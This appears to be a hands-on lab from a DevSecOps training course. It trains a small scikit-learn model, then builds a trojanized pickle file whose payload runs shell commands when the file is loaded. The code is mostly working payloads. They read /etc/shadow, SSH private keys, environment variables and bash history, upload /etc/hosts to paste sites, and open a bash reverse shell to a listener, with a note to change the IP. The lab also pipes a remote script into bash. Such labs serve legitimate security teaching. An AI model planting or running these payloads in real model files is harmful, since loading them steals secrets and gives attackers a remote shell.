```jsx
mkdir trojan-odel
cd trojan-model
```

```jsx
apt update && apt install python3-pip -y
```

```jsx
cat>requirements.txt<<EOF
scikit-learn==1.6.1
numpy>=1.24
scipy>=1.10
joblib>=1.2
EOF
```

```jsx
pip install -r requirements.txt
```

```jsx
cat>train_model.py<<EOF
import pickle
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
data = [
    ("What is AI?", "AI stands for Artificial Intelligence."),
    ("Define ML.", "Machine Learning is a branch of AI."),
    ("Explain deep learning.", "Deep learning uses neural networks."),
    ("What is Python?", "Python is a popular programming language."),
    ("Define CPU.", "CPU stands for Central Processing Unit."),
    ("Define GPU.", "GPU is Graphics Processing Unit."),
    ("What is NLP?", "Natural Language Processing is a part of AI."),
    ("What is data science?", "It is a field of analyzing data."),
    ("What is optimizer?", "Algorithm to minimize loss."),
    ("What is gradient descent?", "Optimization method.")
]

# Extract prompts and responses
X_train = [item[0] for item in data]
y_train = [item[1] for item in data]

# Vectorizer and model
vectorizer = TfidfVectorizer()
X_vec = vectorizer.fit_transform(X_train)
clf = LogisticRegression()
clf.fit(X_vec, y_train)

# Bundle vectorizer, classifier
model_bundle = {
    "vectorizer": vectorizer,
    "classifier": clf
}

# Save model with embedded payload
with open("model.pkl", "wb") as f:
    pickle.dump(model_bundle, f)

print("[✔] Model trained model.pkl")
EOF

```

```jsx
cat>consume_model.py<<EOF
import pickle

# Load the model
with open("model.pkl", "rb") as f:
    model_bundle = pickle.load(f)

# ML inference
vectorizer = model_bundle["vectorizer"]
classifier = model_bundle["classifier"]

prompt = input("Ask a question: ")
X_input = vectorizer.transform([prompt])
response = classifier.predict(X_input)[0]
print("Response:", response)
EOF
```

```jsx
python3 train_model.py
```

```jsx
python3 consume_model.py
```

```jsx
What is NLP?
```

```jsx
Define GPU
```

```jsx
wget -O train-model-with-trojan.py https://gitlab.practical-devsecops.training/-/snippets/80/raw/main/train-model-with-trojan.py
```

```jsx
cat>train-model-with-trojan.py<<EOF
import pickle
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression

data = [
    ("What is AI?", "AI stands for Artificial Intelligence."),
    ("Define ML.", "Machine Learning is a branch of AI."),
    ("Explain deep learning.", "Deep learning uses neural networks."),
    ("What is Python?", "Python is a popular programming language."),
    ("Define CPU.", "CPU stands for Central Processing Unit."),
    ("Define GPU.", "GPU is Graphics Processing Unit."),
    ("What is NLP?", "Natural Language Processing is a part of AI."),
    ("What is data science?", "It is a field of analyzing data."),
    ("What is optimizer?", "Algorithm to minimize loss."),
    ("What is gradient descent?", "Optimization method.")
]

# Extract prompts and responses
X_train = [item[0] for item in data]
y_train = [item[1] for item in data]

# Vectorizer and model
vectorizer = TfidfVectorizer()
X_vec = vectorizer.fit_transform(X_train)
clf = LogisticRegression()
clf.fit(X_vec, y_train)

# Executable code
import os

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/passwd'",))

# Bundle vectorizer, classifier, and payload
model_bundle = {
    "vectorizer": vectorizer,
    "classifier": clf,
    "payload": ExecutablePayload()  # Runs when the model is loaded
}

# Save model with embedded payload
with open("trojan_model.pkl", "wb") as f:
    pickle.dump(model_bundle, f)

print("[✔] Model trained and trojanized as trojan_model.pkl")
EOF
```

```jsx
python3 train-model-with-trojan.py
```

```jsx
cat>consume_model.py<<EOF
import pickle

# Load the model
with open("trojan_model.pkl", "rb") as f:
    model_bundle = pickle.load(f)

# ML inference
vectorizer = model_bundle["vectorizer"]
classifier = model_bundle["classifier"]

prompt = input("Ask a question: ")
X_input = vectorizer.transform([prompt])
response = classifier.predict(X_input)[0]
print("Response:", response)
EOF
```

```jsx
python3 consume_model.py
```

```jsx
import os

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat ~/.ssh/authorized_keys'",))
```

```jsx
import os

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat ~/.ssh/id_rsa'",))
```

```jsx
import os

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/passwd'",))
```

```jsx
import os

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/shadow'",))
```

```jsx
import os

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/os-release'",))
```

```jsx
import os

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/lsb-release'",))
```

```jsx
import os

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/issue'",))
```

```jsx
import os

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/fstab'",))
```

```jsx
import os

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/environment'",))
```

```jsx
import os

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'env>env && cat env'",))
```

```jsx
import os

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat ~/.bash_history'",))
```

**Siphoning Data From The Local Machine To Remote Servers**

```jsx
pastebinit -l
```

```jsx
pastebinit -i /etc/hosts -b pastebin.com
```

```jsx
pastebinit -i /etc/hosts -b dpaste.com
```

**C2Cs via Reverse Shells**

```jsx
nc -nlvp 4444 -s 127.0.0.1
```

```jsx
import os

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'",))
```

```jsx
wget -O - https://gitlab.practical-devsecops.training/-/snippets/81/raw/main/train-and-consume-trojan-model.sh | bash
```

```jsx
cat>train-model-with-trojan.py<<EOF
import pickle
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression

data = [
    ("What is AI?", "AI stands for Artificial Intelligence."),
    ("Define ML.", "Machine Learning is a branch of AI."),
    ("Explain deep learning.", "Deep learning uses neural networks."),
    ("What is Python?", "Python is a popular programming language."),
    ("Define CPU.", "CPU stands for Central Processing Unit."),
    ("Define GPU.", "GPU is Graphics Processing Unit."),
    ("What is NLP?", "Natural Language Processing is a part of AI."),
    ("What is data science?", "It is a field of analyzing data."),
    ("What is optimizer?", "Algorithm to minimize loss."),
    ("What is gradient descent?", "Optimization method.")
]

# Extract prompts and responses
X_train = [item[0] for item in data]
y_train = [item[1] for item in data]

# Vectorizer and model
vectorizer = TfidfVectorizer()
X_vec = vectorizer.fit_transform(X_train)
clf = LogisticRegression()
clf.fit(X_vec, y_train)

import os

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'",)) #Change the IP address as required

# Bundle vectorizer, classifier, and payload
model_bundle = {
    "vectorizer": vectorizer,
    "classifier": clf,
    "payload": ExecutablePayload()  # This runs on load
}

# Save model with embedded payload
with open("trojan_model.pkl", "wb") as f:
    pickle.dump(model_bundle, f)

print("[✔] Model trained and trojanized as trojan_model.pkl")
EOF

cat>model-consumer.py<<EOF
import pickle

# Payload executes on unpickle
with open("trojan_model.pkl", "rb") as f:
    model_bundle = pickle.load(f)

# Regular ML inference still works
vectorizer = model_bundle["vectorizer"]
classifier = model_bundle["classifier"]

prompt = input("Ask a question: ")
X_input = vectorizer.transform([prompt])
response = classifier.predict(X_input)[0]
print("Response:", response)
EOF
```

```jsx
python3 train-model-with-trojan.py
```

```jsx
python3 consume_model.py
```
